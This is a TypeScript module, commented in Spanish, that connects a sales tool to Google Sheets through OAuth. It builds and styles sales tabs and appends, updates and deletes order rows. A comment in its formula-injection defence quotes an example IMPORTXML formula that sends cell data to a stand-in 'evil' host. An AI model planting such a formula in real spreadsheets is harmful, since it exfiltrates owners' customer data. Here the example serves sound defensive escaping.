// ═══════════════════════════════════════════════════════════════════
// Nodo · gsheets.ts — API de Google Sheets vía OAuth del usuario.
// El refresh_token del canal (Vault) se cambia por un access_token y se
// llama a la Sheets API v4. Alinea por encabezados (fila 1) como el
// Apps Script: agrega columnas que falten y respeta el orden.
// ═══════════════════════════════════════════════════════════════════
import { fetchConTimeout } from "./http.ts";
const SHEETS = "https://sheets.googleapis.com/v4/spreadsheets";

// refresh_token → access_token (Client ID/Secret de la app en env).
export async function getAccessToken(refreshToken: string): Promise<string> {
  const res = await fetchConTimeout("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      refresh_token: refreshToken,
      client_id: Deno.env.get("GOOGLE_OAUTH_CLIENT_ID") ?? "",
      client_secret: Deno.env.get("GOOGLE_OAUTH_CLIENT_SECRET") ?? "",
      grant_type: "refresh_token",
    }),
  });
  const d = await res.json();
  if (!res.ok || !d.access_token) throw new Error("no se pudo refrescar el token de Google (¿reconectar?): " + (d.error_description ?? d.error ?? res.status));
  return d.access_token as string;
}

async function api(token: string, url: string, method = "GET", body?: unknown) {
  const res = await fetchConTimeout(url, {
    method,
    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
    body: body ? JSON.stringify(body) : undefined,
  });
  const d = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error("Sheets API " + res.status + ": " + ((d as any)?.error?.message ?? ""));
  return d as any;
}

// Nombre de la primera pestaña (cuando el nodo no especifica una).
async function firstTab(token: string, id: string): Promise<string> {
  const d = await api(token, `${SHEETS}/${id}?fields=sheets.properties.title`);
  return d.sheets?.[0]?.properties?.title ?? "Hoja 1";
}
// Índice 0-based → letra de columna A1 (0→A, 26→AA).
function colA1(n: number): string {
  let s = ""; n++;
  while (n > 0) { const m = (n - 1) % 26; s = String.fromCharCode(65 + m) + s; n = Math.floor((n - 1) / 26); }
  return s;
}
const q = (s: string) => encodeURIComponent(s);
// Casar nombres de pestañas y encabezados sin distinguir mayúsculas ni espacios:
// si el usuario escribió "CEL" a mano, es la misma columna que "Cel".
const norm = (s: string) => s.toString().trim().toLowerCase();

// ── Las 3 hojas de Nodo ────────────────────────────────────────────
// Una por operación: mezclar una venta digital con un despacho a provincia hace
// una hoja ilegible. El orden de las columnas es el orden en que se crean.
export const HOJAS: Record<string, string[]> = {
  // La hoja SOLO guarda ventas CERRADAS (dinero cobrado). Por eso: Lima usa "Valor
  // cobrado" (ya no "a cobrar") y no lleva Estado (siempre sería "entregado"); Provincia
  // no lleva Adelanto/Saldo (ya se pagaron ambos = el total) ni Estado.
  // ⚠️ Este orden tiene que seguir al de `syncPedidoSheet` (engine.ts): son las MISMAS
  // columnas. Si acá falta una, la hoja recién preparada sale incompleta y la columna
  // aparece sola —al final de todo— recién con la primera venta. Se agregaron Cantidad,
  // Extra e «Imagen saldo» el 2026-09-22 y esta lista se había quedado atrás.
  "Digital": ["ID", "Ad ID", "Cliente", "Cel", "Fecha y hora", "Valor", "Producto", "Opción",
    "Cantidad", "Orderbump", "Extra", "Comprobante", "Comprobante extra"],
  "Lima": ["ID", "Ad ID", "Cliente", "Cel", "Fecha y hora", "Distrito", "Dirección",
    "Producto", "Opción", "Cantidad", "Valor cobrado", "Extra"],
  "Provincia": ["ID", "Ad ID", "Cliente", "Cel", "Fecha y hora", "DNI", "Agencia", "Producto", "Opción",
    "Cantidad", "Valor total", "Extra", "Guía", "Comprobante adelanto", "Comprobante saldo"],
};

// Ancho (px) de cada columna de Nodo, por encabezado normalizado.
const ANCHOS: Record<string, number> = {
  "id": 110, "ad id": 170, "cliente": 160, "cel": 125, "fecha y hora": 170, "valor": 80,
  "producto": 240, "opción": 110, "cantidad": 80, "orderbump": 95, "extra": 260,
  "comprobante": 210, "comprobante extra": 210, "distrito": 130, "dirección": 260,
  "valor cobrado": 115, "dni": 100, "agencia": 220, "valor total": 105, "guía": 130,
  "comprobante adelanto": 210, "comprobante saldo": 210,
};

// Nombre viejo (normalizado) → nombre nuevo, por pestaña. «Imagen» pasó a «Comprobante» el
// 2026-09-23 (pedido de Rodrigo): en Provincia la de adelanto y la de saldo.
const RENOMBRADAS: Record<string, Record<string, string>> = {
  "digital": { "imagen": "Comprobante" },
  "provincia": { "imagen": "Comprobante adelanto", "imagen saldo": "Comprobante saldo" },
};

// Deja la hoja LISTA al conectarla: crea las 3 pestañas, escribe los
// encabezados, congela la fila 1 (para que se quede fija al bajar) y la
// formatea. La idea es conectar y ya está — sin pedirle al usuario que cree
// pestañas ni tipee encabezados.
// Es idempotente y NO pisa lo que el usuario ya tenga: si él escribió "CEL",
// esa columna se respeta (el casado ignora mayúsculas).
export async function sheetsBootstrap(token: string, id: string): Promise<{ creadas: string[]; hojas: string[] }> {
  const meta = await api(token, `${SHEETS}/${id}?fields=sheets.properties(sheetId,title)`);
  const actuales: { sheetId: number; title: string }[] = (meta.sheets ?? []).map((s: any) => s.properties);
  const creadas: string[] = [];

  // 1) Las pestañas que falten.
  const nuevas = Object.keys(HOJAS).filter((t) => !actuales.some((s) => norm(s.title) === norm(t)));
  if (nuevas.length) {
    await api(token, `${SHEETS}/${id}:batchUpdate`, "POST", {
      requests: nuevas.map((title) => ({ addSheet: { properties: { title } } })),
    });
    creadas.push(...nuevas);
  }

  // 2) Encabezados + formato, ya con los ids reales de cada pestaña.
  // Trae también bandedRanges: addBanding falla si la pestaña ya tiene banda, así
  // que solo la agregamos donde no exista (mantiene idempotente el "preparar de nuevo").
  const meta2 = await api(token, `${SHEETS}/${id}?fields=sheets(properties(sheetId,title,gridProperties.columnCount),bandedRanges(bandedRangeId))`);
  const mapa = new Map<string, number>();
  const conBanda = new Set<number>();
  for (const s of (meta2.sheets ?? [])) {
    mapa.set(norm(s.properties.title), s.properties.sheetId);
    if (Array.isArray(s.bandedRanges) && s.bandedRanges.length) conBanda.add(s.properties.sheetId);
  }

  // Un color por operación: encabezado, color de banda (fila alterna) y color de la
  // pestaña. Le da identidad visual a cada hoja (morado/azul/verde, como el panel).
  const TEMA: Record<string, { head: any; band: any; tab: any }> = {
    "Digital":   { head: { red: 0.42, green: 0.24, blue: 0.55 }, band: { red: 0.95, green: 0.92, blue: 0.98 }, tab: { red: 0.55, green: 0.36, blue: 0.70 } },
    "Lima":      { head: { red: 0.13, green: 0.40, blue: 0.85 }, band: { red: 0.90, green: 0.94, blue: 1.00 }, tab: { red: 0.17, green: 0.50, blue: 1.00 } },
    "Provincia": { head: { red: 0.08, green: 0.50, blue: 0.38 }, band: { red: 0.90, green: 0.97, blue: 0.94 }, tab: { red: 0.11, green: 0.62, blue: 0.46 } },
  };

  const requests: any[] = [];
  for (const [tab, cols] of Object.entries(HOJAS)) {
    const real = (meta2.sheets ?? []).find((s: any) => norm(s.properties.title) === norm(tab))?.properties?.title ?? tab;
    const heads = await ensureHeaders(token, id, real, cols);
    const nCols = Math.max(heads.length, cols.length);   // incluye las columnas propias del dueño
    const sheetId = mapa.get(norm(tab));
    if (sheetId === undefined) continue;
    const t = TEMA[tab] ?? TEMA["Lima"];
    // Fila 1 congelada (los encabezados se quedan arriba al bajar).
    requests.push({ updateSheetProperties: { properties: { sheetId, gridProperties: { frozenRowCount: 1 } }, fields: "gridProperties.frozenRowCount" } });
    // Color de la pestaña (el tab de abajo).
    requests.push({ updateSheetProperties: { properties: { sheetId, tabColor: t.tab }, fields: "tabColor" } });
    // Filas alternadas para leer fácil (solo si aún no tiene banda).
    if (!conBanda.has(sheetId)) {
      requests.push({ addBanding: { bandedRange: { range: { sheetId, startRowIndex: 0, startColumnIndex: 0, endColumnIndex: cols.length }, rowProperties: { headerColor: t.head, firstBandColor: { red: 1, green: 1, blue: 1 }, secondBandColor: t.band } } } });
    }
    // Encabezado: color de la operación, texto blanco en negrita, centrado.
    // SOLO las columnas con título: sin `endColumnIndex` pintaba la fila 1 ENTERA, hasta la
    // última columna de la hoja (Rodrigo: «¿por qué se pinta todo el encabezado?»). Y lo que
    // quedó pintado de más por esa versión se despinta, así «Revisar las pestañas» lo arregla.
    const totalCols = Number((meta2.sheets ?? []).find((s: any) => s.properties.sheetId === sheetId)?.properties?.gridProperties?.columnCount) || 0;
    if (totalCols > nCols) {   // si no sobra ninguna, el rango caería fuera de la hoja
      requests.push({ repeatCell: { range: { sheetId, startRowIndex: 0, endRowIndex: 1, startColumnIndex: nCols, endColumnIndex: totalCols }, cell: {}, fields: "userEnteredFormat" } });
    }
    requests.push({ repeatCell: { range: { sheetId, startRowIndex: 0, endRowIndex: 1, startColumnIndex: 0, endColumnIndex: nCols }, cell: { userEnteredFormat: { backgroundColor: t.head, textFormat: { bold: true, foregroundColor: { red: 1, green: 1, blue: 1 } }, verticalAlignment: "MIDDLE", horizontalAlignment: "CENTER" } }, fields: "userEnteredFormat(backgroundColor,textFormat,verticalAlignment,horizontalAlignment)" } });
    // Fila de encabezado un poco más alta (respira mejor).
    requests.push({ updateDimensionProperties: { range: { sheetId, dimension: "ROWS", startIndex: 0, endIndex: 1 }, properties: { pixelSize: 34 }, fields: "pixelSize" } });
    // Ancho de cada columna de Nodo según lo que va a llevar. Antes era «ajustar al contenido»,
    // pero se corre al PREPARAR, con la hoja vacía: el ancho quedaba el del encabezado y el
    // celular («Cel», 3 letras) salía cortado. Las columnas propias del dueño no se tocan.
    heads.forEach((h, ci) => {
      const px = ANCHOS[norm(h)];
      if (px) requests.push({ updateDimensionProperties: { range: { sheetId, dimension: "COLUMNS", startIndex: ci, endIndex: ci + 1 }, properties: { pixelSize: px }, fields: "pixelSize" } });
    });
    // Reparación: una versión anterior agregaba filas con INSERT_ROWS y las filas de datos
    // heredaban el formato del ENCABEZADO (todo morado). Si la fila 2 tiene EXACTAMENTE el fondo
    // del encabezado, se les quita ese formato a los datos (vuelve la banda). Un color que el
    // dueño haya puesto a mano no coincide con este y no se toca.
    try {
      const f2 = await api(token, `${SHEETS}/${id}?ranges=${q(real + "!A2")}&fields=sheets.data.rowData.values.userEnteredFormat.backgroundColor`);
      const bg = f2?.sheets?.[0]?.data?.[0]?.rowData?.[0]?.values?.[0]?.userEnteredFormat?.backgroundColor;
      const igual = (a?: number, b?: number) => Math.abs((a ?? 0) - (b ?? 0)) < 0.01;
      if (bg && igual(bg.red, t.head.red) && igual(bg.green, t.head.green) && igual(bg.blue, t.head.blue)) {
        requests.push({ repeatCell: { range: { sheetId, startRowIndex: 1 }, cell: {}, fields: "userEnteredFormat(backgroundColor,textFormat,horizontalAlignment,verticalAlignment)" } });
      }
    } catch (_) { /* la reparación es un extra: nunca tumba el preparar */ }
  }
  if (requests.length) await api(token, `${SHEETS}/${id}:batchUpdate`, "POST", { requests });
  return { creadas, hojas: Object.keys(HOJAS) };
}

// ── Leer / borrar UNA fila por su ID (diagnóstico desde Ajustes) ──────────
// Nodo escribía en la hoja pero no podía leerla: para comprobar qué llegó había que abrirla
// con la cuenta dueña. Lee los encabezados y la fila cuyo «ID» es `orderId`.
export async function sheetsLeerFila(token: string, id: string, tab: string, orderId: string): Promise<{ encabezados: string[]; fila: Record<string, string> | null; n: number | null }> {
  const d = await api(token, `${SHEETS}/${id}/values/${q(tab)}`);
  const vals: string[][] = d.values ?? [];
  const encabezados = vals[0] ?? [];
  const ci = encabezados.findIndex((h) => norm(h) === "id");
  const i = ci < 0 ? -1 : vals.findIndex((r, k) => k > 0 && String(r[ci] ?? "") === orderId);
  if (i < 0) return { encabezados, fila: null, n: null };
  const fila: Record<string, string> = {};
  encabezados.forEach((h, k) => { fila[h] = vals[i][k] ?? ""; });
  return { encabezados, fila, n: i + 1 };
}
export async function sheetsBorrarFila(token: string, id: string, tab: string, orderId: string): Promise<boolean> {
  const { n } = await sheetsLeerFila(token, id, tab, orderId);
  if (!n) return false;
  const meta = await api(token, `${SHEETS}/${id}?fields=sheets.properties(sheetId,title)`);
  const sheetId = (meta.sheets ?? []).find((s: any) => norm(s.properties.title) === norm(tab))?.properties?.sheetId;
  if (sheetId === undefined) return false;
  await api(token, `${SHEETS}/${id}:batchUpdate`, "POST", {
    requests: [{ deleteDimension: { range: { sheetId, dimension: "ROWS", startIndex: n - 1, endIndex: n } } }],
  });
  return true;
}

// ── Crear la hoja desde Nodo ──────────────────────────────────────────
// Conectar Google daba SOLO el permiso: la hoja había que crearla en Drive y pegar el enlace.
// Y si esa hoja se borraba, el canal seguía apuntando a un archivo muerto sin decir nada
// (le pasó a Rodrigo el 2026-09-23: borró la hoja para empezar con el orden limpio, reconectó
// Google, y «Abrir» llevaba a «el archivo fue eliminado»). Ahora Nodo la crea con el permiso
// `spreadsheets` que ya pide — no hace falta ningún permiso de Drive.

// ¿La hoja guardada sigue ahí? 404 = la borraron; 403 = la cuenta conectada ya no la ve.
// ⚠️ Una hoja en la PAPELERA de Drive todavía responde 200 por la Sheets API (sin permiso de
// Drive no se puede saber): se sigue escribiendo en ella hasta que la vacíen.
export async function sheetsEstado(token: string, id: string): Promise<"ok" | "no_existe" | "sin_acceso"> {
  try {
    await api(token, `${SHEETS}/${id}?fields=spreadsheetId`);
    return "ok";
  } catch (e) {
    const m = String((e as any)?.message ?? e);
    if (/Sheets API 404/.test(m)) return "no_existe";
    if (/Sheets API 403/.test(m)) return "sin_acceso";
    throw e;
  }
}

// Crea una hoja nueva con las 3 pestañas ya preparadas (encabezados en orden, colores, fila fija).
export async function sheetsCrear(token: string, titulo: string, timeZone = "America/Lima"): Promise<{ id: string; url: string }> {
  const d = await api(token, SHEETS, "POST", {
    // Sin `locale`: Google rechaza «es_PE» (400 Unsupported locale) y sin él usa el de la cuenta.
    properties: { title: titulo, timeZone },
    sheets: Object.keys(HOJAS).map((title) => ({ properties: { title } })),
  });
  const id = String(d.spreadsheetId ?? "");
  if (!id) throw new Error("Google no devolvió la hoja creada");
  await sheetsBootstrap(token, id);
  return { id, url: String(d.spreadsheetUrl ?? `https://docs.google.com/spreadsheets/d/${id}/edit`) };
}

// Crea la hoja del canal y la deja CONECTADA (channels.gsheets). Lo usan el regreso de Google
// (cuando no hay hoja o la guardada ya no existe) y el botón «Crear una hoja nueva» de Ajustes.
export async function crearHojaDelCanal(db: any, channelId: string, token: string): Promise<{ id: string; url: string; titulo: string }> {
  const { data: ch } = await db.from("channels").select("nombre, timezone, gsheets").eq("id", channelId).maybeSingle();
  const titulo = `Ventas Nodo · ${String((ch as any)?.nombre ?? "").trim() || "mi negocio"}`;
  const r = await sheetsCrear(token, titulo, (ch as any)?.timezone || "America/Lima");
  const g = { ...(((ch as any)?.gsheets ?? {}) as Record<string, unknown>) };
  g.spreadsheet_id = r.id; g.spreadsheet_url = r.url;
  delete g.last_error; delete g.last_error_at;   // el cartel de «no llegó» era de la hoja vieja
  const { error } = await db.from("channels").update({ gsheets: g }).eq("id", channelId);
  if (error) throw new Error("La hoja se creó pero no se pudo guardar en Nodo: " + error.message);
  return { ...r, titulo };
}

// Crea la pestaña si no existe. Sin esto, escribir en una pestaña inexistente
// falla con "Unable to parse range" y —como el error se traga para no romper la
// venta— no se escribía nada y nadie se enteraba.
async function ensureTab(token: string, id: string, tab: string): Promise<void> {
  const d = await api(token, `${SHEETS}/${id}?fields=sheets.properties.title`);
  // norm(): igual que ensureHeaders/sheetsBootstrap. Con `===` exacto, si el dueño renombraba
  // «Lima» a «lima» (o dejaba un espacio) se creaba una pestaña NUEVA y vacía y las ventas
  // siguientes caían ahí mientras él seguía mirando la vieja.
  const existe = (d.sheets ?? []).some((s: any) => norm(String(s?.properties?.title ?? "")) === norm(tab));
  if (existe) return;
  await api(token, `${SHEETS}/${id}:batchUpdate`, "POST", {
    requests: [{ addSheet: { properties: { title: tab } } }],
  });
}

// Lee los encabezados (fila 1), añadiendo los que falten para las claves dadas.
// La comparación es SIN distinguir mayúsculas ni espacios: si el usuario ya
// escribió "AD ID" a mano, se usa ESA columna en vez de crear otra "Ad ID" al
// lado. Devuelve los encabezados reales de la hoja (los del usuario mandan).
async function ensureHeaders(token: string, id: string, tab: string, keys: string[]): Promise<string[]> {
  const hd = await api(token, `${SHEETS}/${id}/values/${q(tab + "!1:1")}`);
  let headers: string[] = hd.values?.[0] ?? [];
  let changed = false;
  if (headers.length === 0) { headers = keys.slice(); changed = keys.length > 0; }
  else {
    // Columnas RENOMBRADAS: se les cambia el título en su lugar. Si no, la hoja que ya tenía
    // «Imagen» ganaba una «Comprobante» vacía al final y la vieja se quedaba huérfana.
    const ren = RENOMBRADAS[norm(tab)] ?? {};
    const yaNuevas = new Set(headers.map(norm));
    headers = headers.map((h) => {
      const nuevo = ren[norm(h)];
      if (nuevo && keys.some((k) => norm(k) === norm(nuevo)) && !yaNuevas.has(norm(nuevo))) { changed = true; yaNuevas.add(norm(nuevo)); return nuevo; }
      return h;
    });
    const yaEstan = new Set(headers.map(norm));
    for (const k of keys) if (!yaEstan.has(norm(k))) { headers.push(k); yaEstan.add(norm(k)); changed = true; }
  }
  if (changed) await api(token, `${SHEETS}/${id}/values/${q(tab + "!1:1")}?valueInputOption=RAW`, "PUT", { values: [headers] });
  return headers;
}

// 🛡️ Anti-inyección de fórmulas: las filas de datos se escriben con USER_ENTERED (para
// que el monto entre como número, no texto), pero eso hace que Sheets EVALÚE cualquier
// celda que empiece con = + - @ (o tab/CR). Como "Cliente", "Dirección", etc. son texto
// LIBRE del cliente, un nombre de perfil tipo =IMPORTXML("https://evil/?d="&C2,"//a") se
// ejecutaría en la hoja del dueño y exfiltraría su base. Se antepone ' para que Sheets lo
// trate como texto literal. Un monto positivo ("120.00") no empieza con esos chars → sigue
// entrando como número; un teléfono "+51..." queda como texto (correcto, no se suma).
function safeCell(v: unknown): string {
  const s = String(v ?? "");
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

// Alinea la fila a los encabezados REALES, casando sin distinguir mayúsculas.
function alinear(headers: string[], fila: Record<string, string>): string[] {
  const porClave = new Map<string, string>();
  for (const [k, v] of Object.entries(fila)) porClave.set(norm(k), v);
  return headers.map((h) => safeCell(porClave.get(norm(h)) ?? ""));
}

// Índice de una columna, casando sin distinguir mayúsculas ("CEL" == "Cel").
const idxDe = (headers: string[], k: string) => headers.findIndex((h) => norm(h) === norm(k));

// Agrega una fila nueva alineada a los encabezados.
// 🎨 `insertDataOption=OVERWRITE`, NO `INSERT_ROWS`: insertar una fila hace que Google le COPIE
// el formato de la de arriba. En una hoja recién preparada la de arriba es el ENCABEZADO (fondo
// morado, blanco, negrita) → cada venta salía pintada como encabezado y tapaba las franjas
// alternadas (Rodrigo: «¿por qué lo pinta todo del mismo color?»). OVERWRITE escribe en la
// siguiente fila VACÍA de la grilla, que ya tiene la banda; si la grilla se acaba, la agranda.
export async function sheetsAppend(token: string, id: string, tab: string | undefined, fila: Record<string, string>) {
  const t = tab || await firstTab(token, id);
  if (tab) await ensureTab(token, id, t);
  const headers = await ensureHeaders(token, id, t, Object.keys(fila));
  const row = alinear(headers, fila);
  await api(token, `${SHEETS}/${id}/values/${q(t)}:append?valueInputOption=USER_ENTERED&insertDataOption=OVERWRITE`, "POST", { values: [row] });
}

// Varias filas en UNA llamada (el append de a una lee los encabezados cada vez).
export async function sheetsAppendMany(token: string, id: string, tab: string, filas: Record<string, string>[]) {
  if (!filas.length) return;
  await ensureTab(token, id, tab);
  const keys = [...new Set(filas.flatMap((f) => Object.keys(f)))];
  const headers = await ensureHeaders(token, id, tab, keys);
  await api(token, `${SHEETS}/${id}/values/${q(tab)}:append?valueInputOption=USER_ENTERED&insertDataOption=OVERWRITE`, "POST",
    { values: filas.map((f) => alinear(headers, f)) });
}

// Borra las filas cuyo ID empieza con `prefijo` (datos de EJEMPLO, p. ej. «PRUEBA-»). De abajo
// hacia arriba para que los índices no se corran al borrar. Devuelve cuántas borró.
export async function sheetsBorrarPorPrefijo(token: string, id: string, tab: string, prefijo: string): Promise<number> {
  if (!prefijo || prefijo.length < 4) throw new Error("prefijo demasiado corto");
  const d = await api(token, `${SHEETS}/${id}/values/${q(tab)}`);
  const vals: string[][] = d.values ?? [];
  const ci = (vals[0] ?? []).findIndex((h) => norm(h) === "id");
  if (ci < 0) return 0;
  const filas = vals.map((r, k) => ({ k, v: String(r[ci] ?? "") })).filter((x) => x.k > 0 && x.v.startsWith(prefijo)).map((x) => x.k);
  if (!filas.length) return 0;
  const meta = await api(token, `${SHEETS}/${id}?fields=sheets.properties(sheetId,title)`);
  const sheetId = (meta.sheets ?? []).find((s: any) => norm(s.properties.title) === norm(tab))?.properties?.sheetId;
  if (sheetId === undefined) return 0;
  await api(token, `${SHEETS}/${id}:batchUpdate`, "POST", {
    requests: filas.sort((a, b) => b - a).map((k) => ({ deleteDimension: { range: { sheetId, dimension: "ROWS", startIndex: k, endIndex: k + 1 } } })),
  });
  return filas.length;
}

// Busca la fila que cumple `buscar` y actualiza las celdas de `fila`.
// Si no la encuentra, agrega una fila con buscar+fila (como el Apps Script).
export async function sheetsUpdate(token: string, id: string, tab: string | undefined, buscar: Record<string, string>, fila: Record<string, string>) {
  const t = tab || await firstTab(token, id);
  if (tab) await ensureTab(token, id, t);
  const headers = await ensureHeaders(token, id, t, [...Object.keys(buscar), ...Object.keys(fila)]);
  const all = await api(token, `${SHEETS}/${id}/values/${q(t)}`);
  const values: string[][] = all.values ?? [];
  let foundRow = -1;
  for (let r = 1; r < values.length; r++) {
    let ok = true;
    for (const k in buscar) {
      const ci = idxDe(headers, k);
      if (ci < 0 || String(values[r]?.[ci] ?? "") !== String(buscar[k])) { ok = false; break; }
    }
    if (ok) { foundRow = r + 1; break; } // fila 1-based en A1
  }
  if (foundRow < 0) { await sheetsAppend(token, id, t, { ...buscar, ...fila }); return; }
  const data = Object.keys(fila)
    .map((k) => ({ ci: idxDe(headers, k), v: safeCell(fila[k]) }))
    .filter((x) => x.ci >= 0)
    .map((x) => ({ range: `${t}!${colA1(x.ci)}${foundRow}`, values: [[x.v]] }));
  if (data.length) await api(token, `${SHEETS}/${id}/values:batchUpdate`, "POST", { valueInputOption: "USER_ENTERED", data });
}
// Ventas digitales de EJEMPLO, con la misma forma que escribe syncPedidoSheet (engine.ts) en la
// pestaña Digital. Variadas a propósito: con y sin anuncio, con 0/1/2 extras, fechas repartidas
// en las últimas 2 semanas. Deterministas (misma semilla → mismas filas).
export function filasDemoDigital(n: number, tz: string): Record<string, string>[] {
  let s = 20260923;
  const r = () => { s = (s * 1103515245 + 12345) % 2147483648; return s / 2147483648; };
  const pick = <T,>(a: T[]) => a[Math.floor(r() * a.length)];
  const PROD = [
    { nombre: "Plantilla de Presupuestos en Excel", ops: [{ o: "Única", p: 19 }] },
    { nombre: "Curso de Cortes en Metal", ops: [{ o: "Básica", p: 49 }, { o: "Completa", p: 89 }] },
    { nombre: "Protocolo Calistenia Militar", ops: [{ o: "Básico", p: 39 }, { o: "Premium", p: 79 }] },
  ];
  const EXTRAS = [{ n: "Pack de plantillas extra", p: 9 }, { n: "Guía PDF de ejercicios", p: 15 }, { n: "Asesoría por WhatsApp", p: 29 }];
  const NOMBRES = ["María Quispe", "José Huamán", "Rosa Flores", "Luis Mendoza", "Carmen Torres", "Jorge Rojas", "Ana Vargas", "Pedro Castillo",
    "Lucía Ramos", "Miguel Chávez", "Diana Salazar", "Carlos Gutiérrez", "Elena Paredes", "Raúl Ccori", "Sofía Aguilar", "Hugo Mamani"];
  const fmt = new Intl.DateTimeFormat("es-PE", { timeZone: tz, day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" });
  const ahora = Date.now();
  const out: { t: number; f: Record<string, string> }[] = [];
  for (let i = 0; i < n; i++) {
    const pr = pick(PROD); const op = pick(pr.ops);
    const nEx = r() < 0.55 ? 0 : (r() < 0.75 ? 1 : 2);
    const ex = [...EXTRAS].sort(() => r() - 0.5).slice(0, nEx);
    const extraTot = ex.reduce((a, b) => a + b.p, 0);
    const conAnuncio = r() < 0.7;
    const cuando = ahora - Math.floor(r() * 14 * 24 * 3600 * 1000);
    out.push({ t: cuando, f: {
      "ID": "",
      "Ad ID": conAnuncio ? "'" + String(120200000000000000 + Math.floor(r() * 9e11)) : "",
      "Cliente": pick(NOMBRES),
      "Cel": "'519" + String(10000000 + Math.floor(r() * 89999999)),
      "Fecha y hora": fmt.format(new Date(cuando)),
      "Valor": String(op.p),
      "Producto": pr.nombre,
      "Opción": op.o,
      "Cantidad": "1",
      "Orderbump": extraTot ? String(extraTot) : "",
      "Extra": ex.map((e) => `${e.n} S/${e.p}`).join(" + "),
      "Comprobante": "https://trackmeta.github.io/Nodo/assets/logo-128.png",
      "Comprobante extra": ex.map(() => "https://trackmeta.github.io/Nodo/assets/logo-128.png").join("\n"),
    } });
  }
  // Por hora REAL (el texto «dd/mm/aaaa» no ordena por fecha) y numeradas en ese orden.
  return out.sort((a, b) => a.t - b.t).map((x, i) => ({ ...x.f, "ID": `PRUEBA-${String(i + 1).padStart(2, "0")}` }));
}
